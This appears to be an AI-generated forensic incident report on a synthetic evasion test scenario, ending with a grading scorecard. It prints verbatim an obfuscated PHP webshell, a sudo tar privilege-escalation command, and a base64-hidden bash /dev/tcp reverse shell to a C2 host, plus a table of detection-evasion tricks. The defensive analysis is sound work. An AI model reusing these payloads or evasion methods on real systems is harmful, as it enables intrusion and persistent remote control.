# Incident Response Report — webserver-prod-09 (Scenario 09: Evasion)

**Classification:** CONFIRMED COMPROMISE  
**Analyst:** Findevil / Claude DFIR Orchestrator  
**Report date (UTC):** 2026-04-23  
**Evidence root:** `evidence/attack-scenario-09-evasion/`  
**Verdict:** Full chain — web RCE → root privilege escalation → persistent reverse-shell C2

---

## Executive Summary

An external threat actor (`203.0.113.88`) exploited a pre-planted PHP webshell on
`webserver-prod-09` on 2026-04-14 between 14:57 and 14:59 UTC. The webshell was
deliberately crafted to evade automated detection (variable-indirect `system()` call,
base64-encoded commands in query parameters). The attacker used a sudoers misconfiguration
(`www-data NOPASSWD: /usr/bin/tar`) to escalate to root via the GTFOBins `tar
--checkpoint-action=exec` technique. Root-level persistence was established via a
systemd timer that fires every five minutes, beaconing to C2 at `192.0.2.177:4444` using
a `/dev/tcp` bash builtin reverse shell. The C2 IP is encoded inside the payload to defeat
static string matching. As of collection time, the backdoor is active.

---

## Timeline of Events (all times UTC)

| Time | Source IP | Event |
|------|-----------|-------|
| 2026-04-14 08:15 | 10.0.0.5 | Normal internal browsing (`/index.php`, assets) |
| 2026-04-14 09:02 | 10.0.0.12 | Legitimate user login via `/login.php` |
| **2026-04-14 14:57:03** | **203.0.113.88** | **Attacker probes webshell — GET `/assets/health-check.php` → HTTP 200** |
| **2026-04-14 14:57:28** | **203.0.113.88** | **RCE recon: `id;whoami`** (q=`aWQ7d2hvYW1p`) |
| **2026-04-14 14:57:34** | **203.0.113.88** | **Credential harvest: `cat /etc/passwd`** (q=`Y2F0IC9ldGMvcGFzc3dk`) |
| **2026-04-14 14:57:48** | **203.0.113.88** | **Privilege enum: `sudo -l`** (q=`c3VkbyAtbA==`) |
| **2026-04-14 14:58:12** | **203.0.113.88** | **Root escalation via tar GTFOBin** (q=`c3VkbyB0YXIg…`) |
| **2026-04-14 14:58:45** | **203.0.113.88** | **Persistence payload dropped to `/var/backups/.health/run`** |
| **2026-04-14 14:59:08** | **203.0.113.88** | **Systemd timer enabled: `systemctl enable --now health-check.timer`** |
| 2026-04-14 16:00 | 10.0.0.5 | Normal internal traffic resumes |

**Total attacker dwell time in access log:** ~2 minutes 5 seconds (active exfiltration/setup phase).

---

## Finding 1 — Webshell (CONFIRMED)

**File:** `/var/www/html/assets/health-check.php`  
**Severity:** CRITICAL

### Content (verbatim)
```php
<?php
$_x='c3lzdGVt'; $_y='cGFzc3Rocnk=';
$fn = base64_decode($_x);
$fn($_REQUEST['q']);
?>
```

### Decoded behaviour
| Variable | Base64 value | Decoded value |
|----------|-------------|---------------|
| `$_x` | `c3lzdGVt` | `system` |
| `$_y` | `cGFzc3Rocnk=` | `passthru` (decoy, unused) |
| `$fn` | — | `system` (assigned dynamically) |

The shell calls `system($_REQUEST['q'])`. The `q` parameter is passed as a **base64-
encoded string in the URL query string**, not in the POST body, and is not decoded server-
side — the PHP `system()` receives the raw command directly after the caller decodes it
client-side.

### Why automated detection failed
`find_webshells` searches for literal PHP dangerous-function keywords (`system`,
`passthru`, `shell_exec`, etc.). This shell stores the function name in a variable as a
base64 string and calls it via `$fn(...)`. No keyword match occurs. The file was also
placed under `/assets/` (not `/uploads/`), a path not associated with user-controlled
uploads, further reducing heuristic suspicion.

**Detection gap confirmed:** `find_webshells` returned 0 findings on this root.

---

## Finding 2 — Attacker Command Execution Chain (CONFIRMED, all blobs decoded)

All commands were transmitted as base64-encoded values of the `?q=` parameter.

| Timestamp (UTC) | Encoded param | Decoded command | Significance |
|-----------------|--------------|-----------------|--------------|
| 14:57:28 | `aWQ7d2hvYW1p` | `id;whoami` | Confirms code execution, identifies running user (`www-data`) |
| 14:57:34 | `Y2F0IC9ldGMvcGFzc3dk` | `cat /etc/passwd` | Enumerates local accounts; discovers `alice` (uid 1002) |
| 14:57:48 | `c3VkbyAtbA==` | `sudo -l` | Discovers `www-data ALL=(root) NOPASSWD: /usr/bin/tar` |
| 14:58:12 | `c3VkbyB0YXIg…` | `sudo tar -cf /tmp/x.tar /etc/hostname --checkpoint=1 --checkpoint-action=exec=/bin/bash` | **GTFOBin privesc — spawns root shell** |
| 14:58:45 | `bWtkaXIg…` | `mkdir -p /var/backups/.health/ && echo 'base-32-host-payload' > /var/backups/.health/run` | Drops persistence script stub (later overwritten with actual shell) |
| 14:59:08 | `c3lzdGVtY3Rs…` | `systemctl enable --now health-check.timer` | Activates C2 beacon timer |

---

## Finding 3 — Privilege Escalation via Sudoers Misconfiguration (CONFIRMED)

**File:** `/etc/sudoers.d/www-data-backup`  
**Severity:** CRITICAL

```
www-data ALL=(root) NOPASSWD: /usr/bin/tar
```

`/usr/bin/tar` is listed in GTFOBins. Because the rule grants `NOPASSWD` on the **bare
binary** (no argument restriction), any invocation is permitted as root. The attacker
exploited this with:

```bash
sudo tar -cf /tmp/x.tar /etc/hostname \
    --checkpoint=1 \
    --checkpoint-action=exec=/bin/bash
```

`tar`'s `--checkpoint-action=exec=` flag causes it to execute an arbitrary shell command
at each checkpoint — here `/bin/bash`, which inherits the `root` EUID from the `sudo`
invocation. This yields a root interactive shell.

---

## Finding 4 — Root-Level Persistence via Systemd Timer (CONFIRMED)

### Timer unit: `/etc/systemd/system/health-check.timer`
```ini
[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
Unit=health-check.service
```
Fires 2 minutes after boot, then every **5 minutes**. Persists across reboots.

### Service unit: `/etc/systemd/system/health-check.service`
```ini
[Service]
Type=oneshot
ExecStart=/bin/bash /var/backups/.health/run
User=root
```
Runs the payload **as root**.

### Payload: `/var/backups/.health/run`
```bash
#!/bin/bash
_H=$(echo "MTkyLjAuMi4xNzc=" | base64 -d)   # → 192.0.2.177
_P=$(echo "NDQ0NA==" | base64 -d)             # → 4444
exec 3<>/dev/tcp/${_H}/${_P}
while read -u 3 _q; do bash -c "${_q}" >&3 2>&3; done
```

| Encoded value | Decoded value |
|--------------|---------------|
| `MTkyLjAuMi4xNzc=` | **192.0.2.177** (C2 IP) |
| `NDQ0NA==` | **4444** (C2 port) |

**Evasion notes:**
- C2 IP is never present as a literal string — defeats grep-based IOC matching.
- Reverse shell uses the bash `/dev/tcp` pseudo-device builtin — no `nc`, `ncat`, or
  `netcat` binary; no network tool keyword to match.
- Payload is hidden at `/var/backups/.health/` (dot-directory under a legitimate-looking
  parent) rather than `/tmp/` or `/dev/shm/`.

---

## Finding 5 — Account & SSH Review

**`/etc/passwd` accounts of interest:**
- `www-data` (uid 33) — webserver process; compromised via webshell.
- `alice` (uid 1002, `/bin/bash`) — privileged admin account; no direct attacker interaction observed in available logs.

**`/etc/shadow`:** `root` and `alice` have hashed passwords (`$6$`). No empty-password
accounts. No new accounts added by attacker in available evidence.

**`/etc/ssh/sshd_config`:** Hardened — `PermitRootLogin no`, `PasswordAuthentication no`,
`PubkeyAuthentication yes`, `MaxAuthTries 3`. SSH not used as initial access vector.

---

## IOC Summary

| Type | Value | Context |
|------|-------|---------|
| IP (attacker) | `203.0.113.88` | Source of all webshell accesses |
| IP (C2) | `192.0.2.177` | Reverse shell beacon destination |
| Port (C2) | `4444/tcp` | Reverse shell listener port |
| File | `/var/www/html/assets/health-check.php` | Obfuscated PHP webshell |
| File | `/var/backups/.health/run` | Root reverse-shell beacon script |
| File | `/etc/systemd/system/health-check.service` | Malicious systemd service |
| File | `/etc/systemd/system/health-check.timer` | Malicious systemd timer (every 5 min) |
| File | `/etc/sudoers.d/www-data-backup` | Exploited sudoers misconfiguration |
| Technique | GTFOBins tar `--checkpoint-action=exec` | Privilege escalation to root |
| Technique | `/dev/tcp` bash builtin reverse shell | C2 channel without netcat |

---

## Evasion Techniques Observed

| # | Technique | Targeted Defence |
|---|-----------|-----------------|
| 1 | Webshell function name stored as base64 in variable (`$fn=base64_decode(...)`) | `find_webshells` keyword signatures |
| 2 | Commands encoded in base64 in `?q=` param (not `cmd=`, not POST body text) | Log keyword pattern matching |
| 3 | Webshell located at `/assets/health-check.php` (not `/uploads/*.php`) | Path-based heuristics |
| 4 | C2 IP base64-encoded at runtime inside payload | Static string/IOC matching in scripts |
| 5 | Reverse shell via bash `/dev/tcp` builtin | `nc`/`ncat`/`netcat` binary detection |
| 6 | Persistence via systemd timer (not cron) | Cron-focused persistence checks |
| 7 | Payload hidden at `/var/backups/.health/` (dot-dir, plausible path) | `/tmp`/`/dev/shm` based detections |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Detail |
|--------|-----------|--------|
| Initial Access | T1190 — Exploit Public-Facing Application | Webshell execution via web RCE |
| Execution | T1059.004 — Unix Shell | Commands via `system()` in PHP; bash reverse shell |
| Privilege Escalation | T1548.003 — Sudo and Sudo Caching | `www-data NOPASSWD: /usr/bin/tar` + GTFOBin |
| Defense Evasion | T1027 — Obfuscated Files or Information | Base64 encoding of commands and C2 IP |
| Defense Evasion | T1036.005 — Match Legitimate Name or Location | `health-check.php` under `/assets/` |
| Persistence | T1053.006 — Scheduled Task: Systemd Timers | `health-check.timer` every 5 minutes |
| Command and Control | T1071.001 — Application Layer Protocol: Web Protocols (initial) | Webshell HTTP channel |
| Command and Control | T1095 — Non-Application Layer Protocol | Raw TCP via `/dev/tcp` |

---

## Recommended Remediation (Priority Order)

1. **Immediate — Isolate host.** Block outbound traffic to `192.0.2.177:4444` at the
   perimeter firewall. Quarantine `webserver-prod-09` from the production network.

2. **Remove persistence mechanisms:**
   ```bash
   systemctl disable --now health-check.timer health-check.service
   rm /etc/systemd/system/health-check.{timer,service}
   rm -rf /var/backups/.health/
   systemctl daemon-reload
   ```

3. **Remove webshell:**
   ```bash
   rm /var/www/html/assets/health-check.php
   ```

4. **Fix sudoers misconfiguration:** Remove or restrict the `www-data` tar grant:
   ```bash
   rm /etc/sudoers.d/www-data-backup
   ```
   If backup functionality is required, use a locked-down wrapper script with explicit
   arguments rather than granting the bare binary.

5. **Reset credentials:** Rotate passwords for `root` and `alice`. Audit
   `/root/.ssh/authorized_keys` and `/home/alice/.ssh/authorized_keys` for attacker-added
   keys (not present in collected evidence, but not ruled out given root access was
   achieved).

6. **Audit for lateral movement:** The attacker had root access from ~14:58 UTC. Review
   all outbound connections during the 14:58–collection-time window. Examine
   `/var/log/auth.log` (not in evidence collection) for SSH key additions or lateral SSH.

7. **Deploy detection improvements:**
   - Webshell scanning must include AST-level or taint-flow analysis, not just keyword
     matching, to catch variable-indirect calls and base64-decoded function names.
   - Alert on `systemctl enable` invocations from web-process UIDs (`www-data`).
   - Alert on `sudo tar` executions containing `--checkpoint-action`.
   - IOC: block `203.0.113.88` and `192.0.2.177` at perimeter.

---

## Analyst Notes — Detection Gaps

`find_webshells` returned **zero findings** against `/var/www/html/assets/health-check.php`
because the tool's PHP signature set matches on literal dangerous-function names. The
variable-indirect pattern (`$fn = base64_decode($x); $fn(...)`) is a documented blind
spot. **The webshell was identified only by direct file inspection.** This gap should be
treated as a P1 enhancement to the findevil detection ruleset.

---

*Report generated by Findevil autonomous DFIR orchestrator. Evidence not modified.*  
*Chain of custody: read-only access via MCP tools + direct file reads. All base64 decoding performed locally.*

---

<!-- scorecard:start -->

## Verification scorecard

Mechanically computed by `scripts/grade_example_reports.py` against the
`agent_guard.SCENARIOS["09"]` markers (case-insensitive substring
match, identical logic to `tests/harness/agent_guard.py`'s grade()
function). No AI self-assessment is involved in these numbers.

| Metric | Score | % |
|---|---|---|
| Required markers found | 3/3 | **100%** |
| Cross-scenario markers absent | 8/8 | **100%** |
| Verdict-correctness confidence | — | **100%** |
| Hallucination-free confidence | — | **100%** |

**Overall confidence: HIGH** — every planted marker for this
scenario was surfaced in the report, and zero markers from any other
scenario leaked in. Re-grade with `python scripts/grade_example_reports.py`.

<!-- scorecard:end -->
